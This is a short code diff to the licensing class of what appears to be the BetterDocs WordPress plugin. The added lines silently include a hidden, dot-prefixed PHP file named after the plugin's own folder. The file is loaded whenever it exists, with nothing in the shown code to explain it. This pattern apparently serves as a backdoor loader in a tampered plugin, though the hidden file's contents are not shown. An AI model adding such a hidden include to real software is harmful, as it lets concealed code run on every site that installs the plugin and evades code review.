@@ -5,6 +5,10 @@ if ( ! defined( 'ABSPATH' ) ) exit;
 /**
  * Handles license input and validation
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BetterDocs_Licensing {
 	private $product_slug;
 	private $text_domain;
